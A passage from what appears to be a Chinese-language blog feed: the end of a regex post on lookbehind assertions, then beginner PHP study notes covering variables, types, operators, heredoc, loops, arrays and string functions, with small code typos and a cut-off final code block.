href="#正向后行断言" class="headerlink" title="正向后行断言"></a>正向后行断言</h3><p>正向后行断言用于获取跟随在特定模式之后的所有匹配内容。正向后行断言表示为 (?&lt;&#x3D;…)。例如正则表达式 (?&lt;&#x3D;(T|t)he\s)(fat|mat)，表示：从输入字符串中获取在单词 The 或 the 之后的所有 fat 和 mat 单词。</p><p>“(?&lt;&#x3D;(T|t)he\s)(fat|mat)” &#x3D;&gt; The <a href="#learn-regex">fat</a> cat sat on the <a href="#learn-regex">mat</a>.</p><h3 id="负向后行断言"><a href="#负向后行断言" class="headerlink" title="负向后行断言"></a>负向后行断言</h3><p>负向后行断言是用于获取不跟随在特定模式之后的所有匹配的内容。负向后行断言表示为 (?&lt;!…)。例如正则表达式 (?&lt;!(T|t)he\s)(cat)，表示：在输入字符中获取所有不在 The 或 the 之后的所有单词 cat。</p><p>“(?&lt;!(T|t)he\s)(cat)” &#x3D;&gt; The cat sat on <a href="#learn-regex">cat</a>.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习笔记</title>
      <link href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP简介"><a href="#PHP简介" class="headerlink" title="PHP简介"></a>PHP简介</h1><ul><li>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</li><li>PHP 脚本在服务器上执行。</li><li>PHP 可免费下载使用。</li><li>PHP 文件的默认文件扩展名是 .php。</li><li>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。</li></ul><h1 id="PHP的学习"><a href="#PHP的学习" class="headerlink" title="PHP的学习"></a>PHP的学习</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-comment">// php 代码</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">例如：</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>My first PHP page<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello World!&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="PHP中的注释"><a href="#PHP中的注释" class="headerlink" title="PHP中的注释"></a>PHP中的注释</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 这是 PHP 单行注释</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这是</span><br><span class="hljs-comment">PHP 多行</span><br><span class="hljs-comment">注释</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>定义变量：</p><p>变量以 $ 符号开始，后面跟着变量的名称</p><p>变量名必须以字母或者下划线字符开始</p><p>变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）</p><p>变量名不能包含空格</p><p>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-number">100</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><p>PHP预定义变量，也称为超全局变量，是在PHP脚本的任何地方都可以访问的内置变量。这些变量用于存储有关PHP运行环境的全局信息，例如服务器信息、客户端请求数据、会话信息等。</p><p><img src="/../image/%E9%A2%84%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F.png"></p><h3 id="打印变量"><a href="#打印变量" class="headerlink" title="打印变量"></a>打印变量</h3><p>echo函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 打印字符串</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我是奶龙&quot;</span>;<br><br><span class="hljs-comment">//打印变量</span><br><span class="hljs-variable">$a</span> = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//也可包含HTML标签</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我是奶龙&lt;br&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>print函数：</p><p>只允许输出一个字符串，返回值总为 1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;奶龙&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>echo和print的区别：</p><p>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p><p>print_r函数：</p><p>可以输出stirng、int、float、array、object等</p><p>输出array时会用结构表示，print_r输出成功时返回true</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/../image/print_r.png"></p><p>var_dump()函数</p><p><strong>var_dump()</strong> 函数用于输出变量的相关信息。</p><p><strong>var_dump()</strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/../image/var_dump.png"></p><h3 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h3><p>unset函数</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unset</span>(变量名);                                                                                      <br></code></pre></td></tr></table></figure><h3 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h3><p>PHP 有四种不同的变量作用域：</p><ul><li>local</li><li>global</li><li>static</li><li>parameter</li></ul><p>注意：在函数内定义的变量是局部变量只能在函数内调用，在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字：</p><h3 id="Static-作用域"><a href="#Static-作用域" class="headerlink" title="Static 作用域"></a>Static 作用域</h3><p>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p><p>要做到这一点，请在您第一次声明变量时使用 <strong>static</strong> 关键字</p><h3 id="判断变量是否存在"><a href="#判断变量是否存在" class="headerlink" title="判断变量是否存在"></a>判断变量是否存在</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">empty</span>(变量名);判断变量值是否为空或<span class="hljs-number">0</span>然后返回<span class="hljs-literal">true</span><br><span class="hljs-keyword">isset</span>(变量名);判断变量存在然后返回<span class="hljs-literal">true</span><br>区别：<br><span class="hljs-keyword">empty</span> 如果值为空或<span class="hljs-number">0</span>；返回<span class="hljs-literal">true</span><br><span class="hljs-keyword">isset</span> 只有值存在才返回<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h3><ul><li>String（字符串）</li><li>Integer（整型）</li><li>Float（浮点型）</li><li>Boolean（布尔型）</li><li>Array（数组）</li><li>Object（对象）</li><li>NULL（空值）</li><li>Resource（资源类型）</li></ul><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>1.自动转换：系统自己判定自己转换</p><p>2.强制类型转换：echo (类型)变量名;</p><p>说明：</p><p>1.bool true&#x3D;1，false&#x3D;0</p><p>2.以字母开头的字符串，永远为0；</p><p>3.以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点）</p><h3 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h3><p>1.松散比较：使用两个等号&#x3D;&#x3D;比较，只比较值，不比较类型</p><p>例如：42&#x3D;&#x3D;”42”返回true</p><p>2.严格比较：用三个等号&#x3D;&#x3D;&#x3D;比较，不仅比较值，还比较类型</p><p>例如：42&#x3D;&#x3D;&#x3D;”42”返回false</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>&#x3D;&#x3D;&#x3D;全等于当左边和右边的值和数据类型都相同是返回true</p><p>!&#x3D;&#x3D;不绝对等于当左边和右边的值不等时或者数据类型不相同时返回true</p><p>其他和c一样</p><h3 id="组合比较符"><a href="#组合比较符" class="headerlink" title="组合比较符"></a>组合比较符</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$c = $a &lt;=&gt; $b<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li>如果 <strong>$a &gt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>1</strong>。</li><li>如果 <strong>$a &#x3D;&#x3D; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>0</strong>。</li><li>如果 <strong>$a &lt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>-1</strong>。</li></ul><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p>优先级： &amp;&amp;  &gt;  &#x3D;  &gt;  and </p><p>优先级： ||  &gt;  &#x3D;  &gt;  or</p><p>其他和c一样</p><h3 id="并置运算符-字符串运算符"><a href="#并置运算符-字符串运算符" class="headerlink" title="并置运算符(字符串运算符)"></a>并置运算符(字符串运算符)</h3><p>并置运算符 (.) 用于把两个字符串值连接起来</p><p>$a .&#x3D; $b表示将$a后面接上$b</p><p>echo $a.$b;也可直接输出$a.$b</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot; world&quot;</span>;<br><span class="hljs-variable">$a</span> .= <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="EOF定界符"><a href="#EOF定界符" class="headerlink" title="EOF定界符"></a>EOF定界符</h3><p>EOF定界符：主要用于定义一个字符串，该字符串可以跨越多行，并且能够保持原有的格式和换行符</p><p>格式：</p><p>$a &#x3D; &lt;&lt;&lt;EOF</p><p>…</p><p>EOF;</p><p>EOF定界符的优点和适用场景：</p><ol><li>‌<strong>保持格式</strong>‌：Heredoc能够保持字符串内部的格式和换行符，适合输出大量HTML或JavaScript代码‌2。</li><li>‌<strong>变量解析</strong>‌：在Heredoc中，变量会被正常解析，这使得在输出大量文本时更加方便和灵活‌12。</li><li>‌<strong>减少转义</strong>‌：在Heredoc中不需要对特殊字符进行转义，简化了字符串的处理过程‌</li></ol><p>例如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;?php<br><span class="hljs-variable">$out</span> = <br>&lt;&lt;&lt;EOF<br>    &lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:edit(&#x27;asd&#x27;, &#x27;aaa&#x27;)&quot;</span>&gt;编辑&lt;/a&gt; |<br><br>    &lt;font <span class="hljs-attribute">color</span>=<span class="hljs-string">&quot;#ccc&quot;</span>&gt;删除&lt;/font&gt;<br><br>    &lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:confirmurl(&#x27;?m=admin&amp;posid=12&#x27;)&quot;</span>&gt;删除&lt;/a&gt; |<br><br>    &lt;font <span class="hljs-attribute">color</span>=<span class="hljs-string">&quot;red&quot;</span>&gt;启用&lt;/font&gt;&lt;/a&gt; |  <br><br>    &lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:preview(&#x27;3&#x27;,&#x27;ds&#x27;)&quot;</span>&gt;&lt;font <span class="hljs-attribute">color</span>=<span class="hljs-string">&quot;green&quot;</span>&gt;演示&lt;/font&gt;&lt;/a&gt;<br>EOF;<br><br>echo <span class="hljs-variable">$out</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>和c一样</p><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(expr1)</span> ? <span class="hljs-comment">(expr2)</span> : <span class="hljs-comment">(expr3)</span> <br></code></pre></td></tr></table></figure><p>和c一样</p><h3 id="回车换行符"><a href="#回车换行符" class="headerlink" title="回车换行符"></a>回车换行符</h3><p>PHP_EOL：回车换行</p><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><p>if语句</p><p>if…else语句</p><p>if…elseif…else语句</p><p>switch语句</p><p>和c一样</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="while循环和for循环"><a href="#while循环和for循环" class="headerlink" title="while循环和for循环"></a>while循环和for循环</h3><p>for循环和c差不多</p><p>while循环do while循环和c差不多</p><p>break跳出循环</p><p>continue跳到下次循环</p><p>exit退出程序</p><h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><p>foreach 循环用于遍历数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) <span class="hljs-comment">// 每次循环都会将数组元素的值赋值给$value</span><br>&#123;<br>要执行代码;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">// 每次循环都会将将数组元素的键与值赋值给$key和$value</span><br>&#123;<br>要执行代码;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$x</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Google&quot;</span>,<span class="hljs-string">&quot;Runoob&quot;</span>,<span class="hljs-string">&quot;Taobao&quot;</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$x</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span> . PHP_EOL;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/../image/foreach.png"></p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数值数组"><a href="#数值数组" class="headerlink" title="数值数组"></a>数值数组</h3><p>数值数组的定义：$arr &#x3D; array(“…”,”…”,”…”);</p><p>例如：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$cars = <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>, <span class="hljs-string">&quot;BMW&quot;</span>, <span class="hljs-string">&quot;Toyota&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p>关联数组有点像c++里的map容器和python的字典</p><p>键值对：一个键对应一个值</p><p>关联数组的定义：$arr &#x3D; array(“…”&#x3D;&gt;”…”,”…”&#x3D;&gt;”…”,”…”&#x3D;&gt;”…”);</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$age</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);<br><span class="hljs-variable">$age</span>[<span class="hljs-string">&quot;Peter&quot;</span>] = <span class="hljs-string">&quot;35&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h3><p>和c差不多就多了个foreach有点像c++的auto遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 遍历数值数组</span><br><span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$$array</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$$array</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// foreach循环遍历数值数组</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.PHP_EOL;<br>&#125;<br><br><span class="hljs-comment">// 遍历关联数组</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;key=&quot;</span>.<span class="hljs-variable">$key</span>.<span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-string">&quot;value=&quot;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><p>数值数组：会自动分配键值,从0开始</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">// 二维数组<br>$arr =<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>(<br>    array(<span class="hljs-string">&quot;Volvo&quot;</span>,100,96),<br>    array(<span class="hljs-string">&quot;BMW&quot;</span>,60,59),<br>    array(<span class="hljs-string">&quot;Toyota&quot;</span>,110,100)<br>);<br></code></pre></td></tr></table></figure><p>关联数组：指定键</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sml">$sites = <span class="hljs-built_in">array</span><br>(<br>    <span class="hljs-string">&quot;runoob&quot;</span>=&gt;<span class="hljs-built_in">array</span><br>    (<br>        <span class="hljs-string">&quot;菜鸟教程&quot;</span>,<br>        <span class="hljs-string">&quot;http://www.runoob.com&quot;</span><br>    ),<br>    <span class="hljs-string">&quot;google&quot;</span>=&gt;<span class="hljs-built_in">array</span><br>    (<br>        <span class="hljs-string">&quot;Google 搜索&quot;</span>,<br>        <span class="hljs-string">&quot;http://www.google.com&quot;</span><br>    ),<br>    <span class="hljs-string">&quot;taobao&quot;</span>=&gt;<span class="hljs-built_in">array</span><br>    (<br>        <span class="hljs-string">&quot;淘宝&quot;</span>,<br>        <span class="hljs-string">&quot;http://www.taobao.com&quot;</span><br>    )<br>); <br></code></pre></td></tr></table></figure><h3 id="数组相关函数"><a href="#数组相关函数" class="headerlink" title="数组相关函数"></a>数组相关函数</h3><p>常用函数：</p><p><img src="/../image/%E6%95%B0%E7%BB%84%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0.png"></p><p>排序函数：</p><p><img src="/../image/%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F%E5%87%BD%E6%95%B0.png"></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><p>function 函数名(变量名)</p><p>{</p><p>​…</p><p>​return (返回值);</p><p>}</p><p>注意：如果要在函数内调用全局变量前面要加global;</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-number">100</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$a</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h3><p>trim()删除字符串两端的空格和其他预定义字符(比如\r,\n)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">a = <span class="hljs-string">&quot;  nailong  &quot;</span>;<br><span class="hljs-variable">$a</span> = trim(<span class="hljs-variable">$a</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>dirname()返回路径中的目录部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__FILE__</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>; <span class="hljs-comment">// __FILE__代表当前文件的绝对路径</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-comment">// 返回值：</span><br><span class="hljs-comment">// E:\CTF\newphp\字符串常用函数.php</span><br><span class="hljs-comment">// E:\CTF\newphp</span><br></code></pre></td></tr></table></figure><p>strlen()获取字符串的长度</p><p>strpos()函数用于在字符串内查找一个字符或指定文本</p><p>htmlspecialchars()预定义字符转html实体编码，只格式化&amp;,’,”,&lt;,&gt;这几个特殊符号</p><p>substr()截取字符串</p><p>其他常用字符串函数：</p><p><img src="/../image/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0.png"></p><h2 id="时间日期函数"><a href="#时间日期函数" class="headerlink" title="时间日期函数"></a>时间日期函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 